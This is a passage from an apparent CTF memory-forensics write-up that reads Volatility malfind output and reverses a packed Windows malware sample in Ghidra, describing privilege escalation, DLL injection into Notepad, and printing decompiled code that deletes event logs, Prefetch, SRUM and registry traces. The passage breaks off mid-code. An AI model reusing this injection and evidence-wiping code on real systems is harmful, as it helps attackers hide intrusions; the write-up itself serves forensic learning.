0xde0074\r\n0x00de0020 b008             MOV AL, 0x8\r\n0x00de0022 eb50             JMP 0xde0074\r\n0x00de0024 b009             MOV AL, 0x9\r\n0x00de0026 eb4c             JMP 0xde0074\r\n0x00de0028 b00a             MOV AL, 0xa\r\n0x00de002a eb48             JMP 0xde0074\r\n0x00de002c b00b             MOV AL, 0xb\r\n0x00de002e eb44             JMP 0xde0074\r\n0x00de0030 b00c             MOV AL, 0xc\r\n0x00de0032 eb40             JMP 0xde0074\r\n0x00de0034 b00d             MOV AL, 0xd\r\n0x00de0036 eb3c             JMP 0xde0074\r\n0x00de0038 b00e             MOV AL, 0xe\r\n0x00de003a eb38             JMP 0xde0074\r\n0x00de003c b00f             MOV AL, 0xf\r\n0x00de003e eb34             JMP 0xde0074\r\n\r\nProcess: iexplore.exe Pid: 2752 Address: 0x5fff0000\r\nVad Tag: VadS Protection: PAGE_EXECUTE_READWRITE\r\nFlags: CommitCharge: 16, MemCommit: 1, PrivateMemory: 1, Protection: 6\r\n\r\n0x5fff0000  64 74 72 52 00 00 00 00 00 05 ff 5f 00 00 00 00   dtrR......._....\r\n0x5fff0010  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................\r\n0x5fff0020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................\r\n0x5fff0030  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................\r\n\r\n0x5fff0000 647472           JZ 0x5fff0075\r\n0x5fff0003 52               PUSH EDX\r\n0x5fff0004 0000             ADD [EAX], AL\r\n0x5fff0006 0000             ADD [EAX], AL\r\n0x5fff0008 0005ff5f0000     ADD [0x5fff], AL\r\n0x5fff000e 0000             ADD [EAX], AL\r\n0x5fff0010 0000             ADD [EAX], AL\r\n0x5fff0012 0000             ADD [EAX], AL\r\n0x5fff0014 0000             ADD [EAX], AL\r\n0x5fff0016 0000             ADD [EAX], AL\r\n0x5fff0018 0000             ADD [EAX], AL\r\n0x5fff001a 0000             ADD [EAX], AL\r\n0x5fff001c 0000             ADD [EAX], AL\r\n0x5fff001e 0000             ADD [EAX], AL\r\n0x5fff0020 0000             ADD [EAX], AL\r\n0x5fff0022 0000             ADD [EAX], AL\r\n0x5fff0024 0000             ADD [EAX], AL\r\n0x5fff0026 0000             ADD [EAX], AL\r\n0x5fff0028 0000             ADD [EAX], AL\r\n0x5fff002a 0000             ADD [EAX], AL\r\n0x5fff002c 0000             ADD [EAX], AL\r\n0x5fff002e 0000             ADD [EAX], AL\r\n0x5fff0030 0000             ADD [EAX], AL\r\n0x5fff0032 0000             ADD [EAX], AL\r\n0x5fff0034 0000             ADD [EAX], AL\r\n0x5fff0036 0000             ADD [EAX], AL\r\n0x5fff0038 0000             ADD [EAX], AL\r\n0x5fff003a 0000             ADD [EAX], AL\r\n0x5fff003c 0000             ADD [EAX], AL\r\n0x5fff003e 0000             ADD [EAX], AL\r\n\r\nProcess: iexplore.exe Pid: 2892 Address: 0x510000\r\nVad Tag: VadS Protection: PAGE_EXECUTE_READWRITE\r\nFlags: CommitCharge: 2, MemCommit: 1, PrivateMemory: 1, Protection: 6\r\n\r\n0x00510000  b0 00 eb 70 b0 01 eb 6c b0 02 eb 68 b0 03 eb 64   ...p...l...h...d\r\n0x00510010  b0 04 eb 60 b0 05 eb 5c b0 06 eb 58 b0 07 eb 54   ...`...\\\\...X...T\r\n0x00510020  b0 08 eb 50 b0 09 eb 4c b0 0a eb 48 b0 0b eb 44   ...P...L...H...D\r\n0x00510030  b0 0c eb 40 b0 0d eb 3c b0 0e eb 38 b0 0f eb 34   ...@...\u003C...8...4\r\n\r\n0x00510000 b000             MOV AL, 0x0\r\n0x00510002 eb70             JMP 0x510074\r\n0x00510004 b001             MOV AL, 0x1\r\n0x00510006 eb6c             JMP 0x510074\r\n0x00510008 b002             MOV AL, 0x2\r\n0x0051000a eb68             JMP 0x510074\r\n0x0051000c b003             MOV AL, 0x3\r\n0x0051000e eb64             JMP 0x510074\r\n0x00510010 b004             MOV AL, 0x4\r\n0x00510012 eb60             JMP 0x510074\r\n0x00510014 b005             MOV AL, 0x5\r\n0x00510016 eb5c             JMP 0x510074\r\n0x00510018 b006             MOV AL, 0x6\r\n0x0051001a eb58             JMP 0x510074\r\n0x0051001c b007             MOV AL, 0x7\r\n0x0051001e eb54             JMP 0x510074\r\n0x00510020 b008             MOV AL, 0x8\r\n0x00510022 eb50             JMP 0x510074\r\n0x00510024 b009             MOV AL, 0x9\r\n0x00510026 eb4c             JMP 0x510074\r\n0x00510028 b00a             MOV AL, 0xa\r\n0x0051002a eb48             JMP 0x510074\r\n0x0051002c b00b             MOV AL, 0xb\r\n0x0051002e eb44             JMP 0x510074\r\n0x00510030 b00c             MOV AL, 0xc\r\n0x00510032 eb40             JMP 0x510074\r\n0x00510034 b00d             MOV AL, 0xd\r\n0x00510036 eb3c             JMP 0x510074\r\n0x00510038 b00e             MOV AL, 0xe\r\n0x0051003a eb38             JMP 0x510074\r\n0x0051003c b00f             MOV AL, 0xf\r\n0x0051003e eb34             JMP 0x510074\r\n\r\nProcess: iexplore.exe Pid: 2892 Address: 0x5fff0000\r\nVad Tag: VadS Protection: PAGE_EXECUTE_READWRITE\r\nFlags: CommitCharge: 16, MemCommit: 1, PrivateMemory: 1, Protection: 6\r\n\r\n0x5fff0000  64 74 72 52 00 00 00 00 00 05 ff 5f 00 00 00 00   dtrR......._....\r\n0x5fff0010  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................\r\n0x5fff0020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................\r\n0x5fff0030  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................\r\n\r\n0x5fff0000 647472           JZ 0x5fff0075\r\n0x5fff0003 52               PUSH EDX\r\n0x5fff0004 0000             ADD [EAX], AL\r\n0x5fff0006 0000             ADD [EAX], AL\r\n0x5fff0008 0005ff5f0000     ADD [0x5fff], AL\r\n0x5fff000e 0000             ADD [EAX], AL\r\n0x5fff0010 0000             ADD [EAX], AL\r\n0x5fff0012 0000             ADD [EAX], AL\r\n0x5fff0014 0000             ADD [EAX], AL\r\n0x5fff0016 0000             ADD [EAX], AL\r\n0x5fff0018 0000             ADD [EAX], AL\r\n0x5fff001a 0000             ADD [EAX], AL\r\n0x5fff001c 0000             ADD [EAX], AL\r\n0x5fff001e 0000             ADD [EAX], AL\r\n0x5fff0020 0000             ADD [EAX], AL\r\n0x5fff0022 0000             ADD [EAX], AL\r\n0x5fff0024 0000             ADD [EAX], AL\r\n0x5fff0026 0000             ADD [EAX], AL\r\n0x5fff0028 0000             ADD [EAX], AL\r\n0x5fff002a 0000             ADD [EAX], AL\r\n0x5fff002c 0000             ADD [EAX], AL\r\n0x5fff002e 0000             ADD [EAX], AL\r\n0x5fff0030 0000             ADD [EAX], AL\r\n0x5fff0032 0000             ADD [EAX], AL\r\n0x5fff0034 0000             ADD [EAX], AL\r\n0x5fff0036 0000             ADD [EAX], AL\r\n0x5fff0038 0000             ADD [EAX], AL\r\n0x5fff003a 0000             ADD [EAX], AL\r\n0x5fff003c 0000             ADD [EAX], AL\r\n0x5fff003e 0000             ADD [EAX], AL\r\n\r\nPS D:\\DFIR-LABS\\bi0sctfchall1>\r\n```\r\nOnto some explanation here - What malfind does is to look for memory pages marked for execution AND that don't have an associated file mapped to disk (signs of code injection). You still need to look at each result to find the malicios code (look for the portable executable signature or shell code)\r\n\r\nSome notes which are helpful are  - \r\n\r\nPAGE_EXECUTE_READWRITE is suspicious because normal code pages are usually PAGE_EXECUTE_READ, meaning they can run but not be modified. When a page is both executable and writable it often indicates injected or self-modifying shellcode.\r\n\r\nVadS with PrivateMemory means the memory region is not mapped from a file. Legitimate code (DLLs, EXEs) is usually file-backed. Private, executable memory is a common sign of code injection via VirtualAlloc or similar APIs.\r\n\r\nIn the explorer.exe example, the instructions `MOV EDX, 0x80; MOV EAX, 0xfdeea138; JMP [EAX]` look like a hook redirecting execution, and the changing values (0x80, 0x81, 0x82) resemble a syscall or function pointer table hook. In the iexplore.exe processes, repeated patterns like `MOV AL, 0x0 / JMP 0xf60074` and `MOV AL, 0x1 / JMP 0xf60074` across multiple instances point to process injection. Identical injected code in multiple processes strongly suggests malicious activity.\r\n\r\n\r\nOnto the malware binary , lemme try to dump it and try to reverse it using ghidra . \r\n\r\n\r\nBefore that lemme check what dll's were being used - \r\n\r\n\r\n![image](/images/posts/like-father-like-son/batman-1.png)\r\n\r\n\r\n\r\nADVAPI32.dll provides access to the Windows registry, security functions, and service management - this allows the malware to establish persistence by creating registry keys or installing itself as a service. The sechost.dll library enables security-related operations and privilege manipulation. RPCRT4.dll provides Remote Procedure Call functionality, allowing the malware to communicate with other processes on the system.\r\n\r\n\r\nUSER32.dll manages windows and user input, while GDI32.dll handles graphics rendering. SHELL32.dll is particularly significant as it provides shell and file operation functions, including the ability to execute other programs. This explains how scvhost.exe was able to spawn the notepad.exe process. SHLWAPI.dll provides additional shell utility functions for path and file operations.\r\n\r\n\r\nRunning strings on the binary revealed a lot , Privilege escalation capabilities are evident through the AdjustTokenPrivileges, OpenProcessToken, and LookupPrivilegeValueA imports. These functions allow the malware to manipulate security tokens and potentially elevate its privileges . The malware imports RegOpenKeyExA, RegDeleteKeyA, RegDeleteKeyW, RegDeleteTreeA, RegDeleteTreeW, RegDeleteValueA, and RegDeleteValueW. While these functions can delete registry entries, they are typically paired with registry writing functions to establish autorun keys that would cause the malware to execute on system startup.\r\n\r\n\r\n\r\n\r\nEnough bs lets run it on ghidra . \r\n\r\n\r\n![image](/images/posts/like-father-like-son/batman-2.png)\r\n\r\n\r\nThe dissasembly seems to be a mess , then on the program trees , it showed that the exe has been packed with UPX , so lets unpack and load it again \r\n\r\n\r\n![image](/images/posts/like-father-like-son/batman-3.png)\r\n\r\nI wasted a lot of time trying to dump this , but got a error with UPX .\r\n\r\nMalware sometimes alters its UPX headers in memory to block unpacking, so using `procdump` can produce a tampered binary that UPX refuses to decompress. In this case, `dumpfiles` from Volatility pulled the untouched executable from the Windows file cache instead of process memory, allowing UPX to successfully unpack it. When UPX fails with a “possibly modified/hacked” error on a memory dump, always try retrieving the file from cache.\r\n\r\n![image](/images/posts/like-father-like-son/batman-4.png)\r\n\r\nNow that the procdump version is working let's move onto reversing this . \r\n\r\n\r\nI am using ghidra because idk ida \r\n\r\n![image](/images/posts/like-father-like-son/batman-5.png)\r\n\r\n\r\nWe see some sus strings \r\n\r\n\r\nAlso i spotted a starnge env called AZRAEL\r\n![image](/images/posts/like-father-like-son/batman-6.png)\r\n\r\nLet's try to understand what this malware is doing  .\r\n\r\n\r\n\r\nThis is a lot , ill try to explain the important parts \r\n\r\n\r\n![image](/images/posts/like-father-like-son/batman-7.png)\r\n\r\n\r\nChecks if running with admin privileges, If not elevated, uses ShellExecuteExA() with \"runas\" to relaunch \"scvhost.exe\" with admin rights , Exits if user cancels UAC prompt (error 0x4c7)\r\n\r\n\r\n\r\nI spotted the malware using  a function  for privilage escalation  . \r\n\r\n![image](/images/posts/like-father-like-son/batman-8.png)\r\n\r\n\r\nThis function enables SeDebugPrivilege for the current process by opening the process token, looking up the SeDebugPrivilege LUID, and calling AdjustTokenPrivileges to turn it on. Enabling that privilege lets the program open and manipulate other processes, including system-owned ones, which malware commonly uses to inject code, read memory (for credential theft), or tamper with protected processes. The sequence is a classic first step in process injection and privilege escalation.\r\n\r\n![image](/images/posts/like-father-like-son/batman-9.png)\r\n\r\nIn short this does - K32EnumProcesses() → K32EnumProcessModules() → K32GetModuleFileNameExA()\r\nMultiByteToWideChar() → FUN_140031c70(L\"Notepad.exe\") , im guessing this is to store , its process ID for later injection . \r\n\r\n\r\n![image](/images/posts/like-father-like-son/batman-10.png)\r\n\r\n\r\nRetrieves encryption key from environment variable \"AZRAEL\" , XORs the key with 0x33\r\n\r\n![image](/images/posts/like-father-like-son/batman-11.png)\r\n\r\n\r\nOpens C:\\confidential.bin for reading -> Creates C:\\Windows\\windowsupdate.bin for output\r\n\r\nIm not sure right now about whats being done next but an XOR is happening tho and it's doing twice ? \r\n\r\n\r\n![image](/images/posts/like-father-like-son/batman-12.png)\r\n\r\nClassic DLL injection ah . Opens Notepad process with full access ->Allocates memory in Notepad's address space->Writes path to malicious DLL: Msrct.dll->Creates remote thread to load the DLL\r\n\r\n\r\nThen the malware tries to hide itself by deleating everything\r\n\r\n```c\r\n\r\n                CloseHandle(pvVar10);\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002ba6;\r\n                FUN_140073680();\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002bc6;\r\n                FUN_1400a8620((longlong *)(&stack0x000003a0 + lVar3),\r\n                              \"C:\\\\Windows\\\\AppCompat\\\\Programs\\\\amcache.hve\");\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002bd5;\r\n                FUN_1400736b0();\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002be4;\r\n                pcVar12 = (char *)FUN_140031060((undefined8 *)(&stack0x000003a0 + lVar3));\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002bec;\r\n                remove(pcVar12);\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002bfb;\r\n                FUN_140073680();\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002c1b;\r\n                FUN_1400a8620((longlong *)(&stack0x00000380 + lVar3),\r\n                              \"C:\\\\Windows\\\\AppCompat\\\\Programs\\\\ShimCache.sys\");\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002c2a;\r\n                FUN_1400736b0();\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002c39;\r\n                pcVar12 = (char *)FUN_140031060((undefined8 *)(&stack0x00000380 + lVar3));\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002c41;\r\n                remove(pcVar12);\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002c50;\r\n                FUN_140073680();\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002c70;\r\n                FUN_1400a8620((longlong *)(&stack0x00000360 + lVar3),\"C:\\\\Windows\\\\Prefetch\");\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002c7f;\r\n                FUN_1400736b0();\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002c8e;\r\n                pcVar12 = (char *)FUN_140031060((undefined8 *)(&stack0x00000360 + lVar3));\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002c96;\r\n                remove(pcVar12);\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002ca5;\r\n                FUN_140073680();\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002cc5;\r\n                FUN_1400a8620((longlong *)(&stack0x00000340 + lVar3),\r\n                              \"C:\\\\Windows\\\\System32\\\\winevt\\\\Logs\");\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002cd4;\r\n                FUN_1400736b0();\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002ce3;\r\n                pcVar12 = (char *)FUN_140031060((undefined8 *)(&stack0x00000340 + lVar3));\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002ceb;\r\n                remove(pcVar12);\r\n                *(undefined1 **)(&stack0xffffffffffffffe0 + lVar4 + lVar3) =\r\n                     &stack0x00000338 + lVar3;\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002d1d;\r\n                RegOpenKeyExA((HKEY)0xffffffff80000002,\r\n                              \"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution  Options\"\r\n                              ,0,0xf003f,*(PHKEY *)(&stack0xffffffffffffffe0 + lVar4 + lVar3));\r\n                pHVar2 = *(HKEY *)(&stack0x00000338 + lVar3);\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002d43;\r\n                RegDeleteKeyExA(pHVar2,\"notepad.exe\",0x100,0);\r\n                pHVar2 = *(HKEY *)(&stack0x00000338 + lVar3);\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002d69;\r\n                RegDeleteKeyExA(pHVar2,\"notepad.exe\",0x200,0);\r\n                pHVar2 = *(HKEY *)(&stack0x00000338 + lVar3);\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002d7c;\r\n                RegCloseKey(pHVar2);\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002d81;\r\n                FUN_140001e00();\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002d86;\r\n                FUN_140001eed();\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002d8b;\r\n                FUN_140001fd0();\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002d9a;\r\n                remove(\"C:\\\\confidential.bin\");\r\n                *(undefined1 **)(&stack0xffffffffffffffe0 + lVar4 + lVar3) =\r\n                     &stack0x00000330 + lVar3;\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002dcc;\r\n                RegOpenKeyExW((HKEY)0xffffffff80000002,\r\n                              L\"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Executio n Options\"\r\n                              ,0,0xf003f,*(PHKEY *)(&stack0xffffffffffffffe0 + lVar4 + lVar3));\r\n                pHVar2 = *(HKEY *)(&stack0x00000330 + lVar3);\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002df2;\r\n                RegDeleteKeyExW(pHVar2,L\"notepad.exe\",0x100,0);\r\n                pHVar2 = *(HKEY *)(&stack0x00000330 + lVar3);\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002e18;\r\n                RegDeleteKeyExW(pHVar2,L\"notepad.exe\",0x200,0);\r\n                pHVar2 = *(HKEY *)(&stack0x00000330 + lVar3);\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002e2b;\r\n                RegCloseKey(pHVar2);\r\n                *(undefined1 **)(&stack0xffffffffffffffe0 + lVar4 + lVar3) =\r\n                     &stack0x00000328 + lVar3;\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002e5d;\r\n                RegOpenKeyExA((HKEY)0xffffffff80000002,\r\n                              \"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution  Options\"\r\n                              ,0,0xf003f,*(PHKEY *)(&stack0xffffffffffffffe0 + lVar4 + lVar3));\r\n                pHVar2 = *(HKEY *)(&stack0x00000328 + lVar3);\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002e77;\r\n                RegDeleteKeyA(pHVar2,\"notepad.exe\");\r\n                pHVar2 = *(HKEY *)(&stack0x00000328 + lVar3);\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002e8a;\r\n                RegCloseKey(pHVar2);\r\n                *(undefined1 **)(&stack0xffffffffffffffe0 + lVar4 + lVar3) =\r\n                     &stack0x00000320 + lVar3;\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002ebc;\r\n                RegOpenKeyExW((HKEY)0xffffffff80000002,\r\n                              L\"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Executio n Options\"\r\n                              ,0,0xf003f,*(PHKEY *)(&stack0xffffffffffffffe0 + lVar4 + lVar3));\r\n                pHVar2 = *(HKEY *)(&stack0x00000320 + lVar3);\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002ed6;\r\n                RegDeleteKeyW(pHVar2,L\"notepad.exe\");\r\n                pHVar2 = *(HKEY *)(&stack0x00000320 + lVar3);\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002ee9;\r\n                RegCloseKey(pHVar2);\r\n                *(undefined1 **)(&stack0xffffffffffffffe0 + lVar4 + lVar3) =\r\n                     &stack0x00000318 + lVar3;\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002f1b;\r\n                RegOpenKeyExA((HKEY)0xffffffff80000002,\r\n                              \"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution  Options\"\r\n                              ,0,0xf003f,*(PHKEY *)(&stack0xffffffffffffffe0 + lVar4 + lVar3));\r\n                pHVar2 = *(HKEY *)(&stack0x00000318 + lVar3);\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002f35;\r\n                RegDeleteValueA(pHVar2,\"notepad.exe\");\r\n                pHVar2 = *(HKEY *)(&stack0x00000318 + lVar3);\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002f48;\r\n                RegCloseKey(pHVar2);\r\n                *(undefined1 **)(&stack0xffffffffffffffe0 + lVar4 + lVar3) =\r\n                     &stack0x00000310 + lVar3;\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002f7a;\r\n                RegOpenKeyExW((HKEY)0xffffffff80000002,\r\n                              L\"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Executio n Options\"\r\n                              ,0,0xf003f,*(PHKEY *)(&stack0xffffffffffffffe0 + lVar4 + lVar3));\r\n                pHVar2 = *(HKEY *)(&stack0x00000310 + lVar3);\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002f94;\r\n                RegDeleteValueW(pHVar2,L\"notepad.exe\");\r\n                pHVar2 = *(HKEY *)(&stack0x00000310 + lVar3);\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002fa7;\r\n                RegCloseKey(pHVar2);\r\n                *(undefined1 **)(&stack0xffffffffffffffe0 + lVar4 + lVar3) =\r\n                     &stack0x00000308 + lVar3;\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002fd9;\r\n                RegOpenKeyExA((HKEY)0xffffffff80000002,\r\n                              \"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution  Options\"\r\n                              ,0,0xf003f,*(PHKEY *)(&stack0xffffffffffffffe0 + lVar4 + lVar3));\r\n                pHVar2 = *(HKEY *)(&stack0x00000308 + lVar3);\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140002ff3;\r\n                RegDeleteTreeA(pHVar2,\"notepad.exe\");\r\n                pHVar2 = *(HKEY *)(&stack0x00000308 + lVar3);\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003006;\r\n                RegCloseKey(pHVar2);\r\n                *(undefined1 **)(&stack0xffffffffffffffe0 + lVar4 + lVar3) =\r\n                     &stack0x00000300 + lVar3;\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003038;\r\n                RegOpenKeyExW((HKEY)0xffffffff80000002,\r\n                              L\"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Executio n Options\"\r\n                              ,0,0xf003f,*(PHKEY *)(&stack0xffffffffffffffe0 + lVar4 + lVar3));\r\n                pHVar2 = *(HKEY *)(&stack0x00000300 + lVar3);\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003052;\r\n                RegDeleteTreeW(pHVar2,L\"notepad.exe\");\r\n                pHVar2 = *(HKEY *)(&stack0x00000300 + lVar3);\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003065;\r\n                RegCloseKey(pHVar2);\r\n                *(undefined1 **)(&stack0xffffffffffffffe0 + lVar4 + lVar3) =\r\n                     &stack0x000002f8 + lVar3;\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003097;\r\n                RegOpenKeyExA((HKEY)0xffffffff80000002,\r\n                              \"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution  Options\"\r\n                              ,0,0xf003f,*(PHKEY *)(&stack0xffffffffffffffe0 + lVar4 + lVar3));\r\n                pHVar2 = *(HKEY *)(&stack0x000002f8 + lVar3);\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x1400030b1;\r\n                RegDeleteTreeA(pHVar2,\"notepad.exe\");\r\n                pHVar2 = *(HKEY *)(&stack0x000002f8 + lVar3);\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x1400030c4;\r\n                RegCloseKey(pHVar2);\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x1400030d3;\r\n                FUN_140073680();\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x1400030f3;\r\n                FUN_1400a8620((longlong *)(&stack0x000002d0 + lVar3),\r\n                              \"C:\\\\Windows\\\\System32\\\\config\\\\systemprofile\\\\AppData\\\\Local\\\\Temp\\\\* \"\r\n                             );\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003102;\r\n                FUN_1400736b0();\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003111;\r\n                pcVar12 = (char *)FUN_140031060((undefined8 *)(&stack0x000002d0 + lVar3));\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003119;\r\n                remove(pcVar12);\r\n                *(undefined1 **)(&stack0xffffffffffffffe0 + lVar4 + lVar3) =\r\n                     &stack0x000002c8 + lVar3;\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x14000314b;\r\n                RegOpenKeyExA((HKEY)0xffffffff80000002,\r\n                              \"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\AppCompatFlags\\\\Comp atibility Assistant\\\\Store\"\r\n                              ,0,0xf003f,*(PHKEY *)(&stack0xffffffffffffffe0 + lVar4 + lVar3));\r\n                pHVar2 = *(HKEY *)(&stack0x000002c8 + lVar3);\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003165;\r\n                RegDeleteValueA(pHVar2,\"BAM\");\r\n                pHVar2 = *(HKEY *)(&stack0x000002c8 + lVar3);\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003178;\r\n                RegCloseKey(pHVar2);\r\n                *(undefined1 **)(&stack0xffffffffffffffe0 + lVar4 + lVar3) =\r\n                     &stack0x000002c0 + lVar3;\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x1400031aa;\r\n                RegOpenKeyExA((HKEY)0xffffffff80000002,\r\n                              \"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\AppCompatFlags\\\\Comp atibility Assistant\\\\Store\"\r\n                              ,0,0xf003f,*(PHKEY *)(&stack0xffffffffffffffe0 + lVar4 + lVar3));\r\n                pHVar2 = *(HKEY *)(&stack0x000002c0 + lVar3);\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x1400031c4;\r\n                RegDeleteValueA(pHVar2,\"DAM\");\r\n                pHVar2 = *(HKEY *)(&stack0x000002c0 + lVar3);\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x1400031d7;\r\n                RegCloseKey(pHVar2);\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x1400031e6;\r\n                FUN_140073680();\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003206;\r\n                FUN_1400a8620((longlong *)(&stack0x000002a0 + lVar3),\r\n                              \"C:\\\\Windows\\\\System32\\\\config\\\\systemprofile\\\\AppData\\\\Local\\\\Microso ft\\\\Windows\\\\History\\\\History.IE5\\\\ActivitiesCache.db\"\r\n                             );\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003215;\r\n                FUN_1400736b0();\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003224;\r\n                pcVar12 = (char *)FUN_140031060((undefined8 *)(&stack0x000002a0 + lVar3));\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x14000322c;\r\n                remove(pcVar12);\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x14000323b;\r\n                FUN_140073680();\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x14000325b;\r\n                FUN_1400a8620((longlong *)(&stack0x00000280 + lVar3),\r\n                              \"C:\\\\Windows\\\\System32\\\\SRUM\\\\SRUM.DAT\");\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x14000326a;\r\n                FUN_1400736b0();\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003279;\r\n                pcVar12 = (char *)FUN_140031060((undefined8 *)(&stack0x00000280 + lVar3));\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003281;\r\n                remove(pcVar12);\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003290;\r\n                FUN_140073680();\r\n      